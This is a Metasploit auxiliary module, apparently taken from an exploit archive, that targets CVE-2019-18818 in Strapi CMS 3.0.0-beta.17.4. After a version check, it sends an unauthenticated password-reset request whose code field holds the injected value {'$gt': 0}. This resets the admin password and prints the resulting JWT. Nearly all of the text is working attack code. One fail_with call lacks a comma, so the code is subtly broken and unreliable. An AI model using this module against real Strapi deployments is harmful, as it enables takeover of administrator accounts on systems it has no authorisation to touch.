##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,

      'Name'           => "Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)",
      'Description'    => %q{
        This exploit module abuses the mishandling of password reset in JSON for Strapi CMS version 3.0.0-beta.17.4 to change the password of a privileged user.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'WackyH4cker' ],
      'References'     =>
        [
          [ 'URL', 'https://vulners.com/cve/CVE-2019-18818' ]
        ],
      'Platform'       => 'linux',
      'Targets'        => [
        [ 'Strapi 3.0.0-beta-17.4', {} ]
      ],
      'Payload'        => '',
      'Privileged'     => true,
      'DisclosureDate' => "",
      'DefaultOptions' =>
        {
          'SSL' => 'False',
          'RPORT' => 80,
        },
      'DefaultTarget'  => 0

      ))

      register_options [
        OptString.new('NEW_PASSWORD', [true, 'New password for user Admin'])
      ]
  end

  def check

    res = send_request_raw({ 'uri' => '/admin/init' })
    version = JSON.parse(res.body)

    if version["data"]["strapiVersion"] == '3.0.0-beta.17.4'
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end

  end

  def run

    json_body = { 'code' => {'$gt' => 0},
      'password' => datastore['NEW_PASSWORD'],
      'passwordConfirmation' => datastore['NEW_PASSWORD'] }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/admin/auth/reset-password',
      'ctype' => 'application/json',
      'data' => JSON.generate(json_body)
    })

    print_status("Changing password...")
    json_format = JSON.parse(res.body)
    jwt = json_format['jwt']

    if res.code == 200
      print_good("Password changed successfully!")
      print_good("USER: admin")
      print_good("PASSWORD: #{datastore['NEW_PASSWORD']}")
      print_good("JWT: #{jwt}")
    else
      fail_with(Failure::NoAccess"Could not change admin user password")
    end
  end

end